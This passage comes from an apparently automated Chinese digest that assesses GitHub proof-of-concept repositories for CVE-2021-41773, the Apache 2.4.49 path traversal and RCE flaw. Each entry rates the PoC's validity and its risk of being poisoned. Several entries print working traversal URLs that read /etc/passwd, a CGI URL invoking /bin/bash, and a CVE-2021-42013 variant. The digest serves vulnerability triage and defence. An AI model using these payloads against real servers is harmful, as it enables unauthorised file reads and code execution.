1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
